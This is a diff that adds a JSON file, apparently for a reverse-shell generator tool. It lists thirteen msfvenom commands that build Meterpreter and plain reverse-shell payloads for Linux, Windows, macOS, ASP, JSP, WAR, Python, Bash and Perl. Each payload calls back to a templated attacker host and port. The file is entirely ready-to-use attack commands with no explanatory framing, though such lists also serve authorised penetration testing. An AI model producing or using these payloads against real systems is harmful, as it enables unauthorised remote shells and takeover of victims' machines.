@@ -1,0 +1,93 @@
+[  
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f elf > shell.elf",
+    "note": null,
+    "id": "meterpreter1"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f exe > shell.exe",
+    "note": null,
+    "id": "meterpreter2"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f macho > shell.macho",
+    "note": null,
+    "id": "meterpreter3"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f asp > shell.asp",
+    "note": null,
+    "id": "meterpreter4"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f raw > shell.jsp",
+    "note": null,
+    "id": "meterpreter5"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f war > shell.war",
+    "note": null,
+    "id": "meterpreter6"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p cmd/unix/reverse_python LHOST=\"{LHOST}\" LPORT={LPORT} -f raw > shell.py",
+    "note": null,
+    "id": "meterpreter7"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p cmd/unix/reverse_bash LHOST=\"{LHOST}\" LPORT={LPORT} -f raw > shell.sh",
+    "note": null,
+    "id": "meterpreter8"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p cmd/unix/reverse_perl LHOST=\"{LHOST}\" LPORT={LPORT} -f raw > shell.pl",
+    "note": null,
+    "id": "meterpreter9"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe",
+    "note": "Windows Staged reverse TCP",
+    "id": "meterpreter10"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe",
+    "note": "Windows Stageless reverse TCP",
+    "id": "meterpreter11"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf",
+    "note": "Linux Staged reverse TCP",
+    "id": "meterpreter12"
+  },
+  {
+    "type": "meterpreter",
+    "direction": "reverse",
+    "payload": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf",
+    "note": "Linux Stageless reverse TCP",
+    "id": "meterpreter13"
+  }
+]
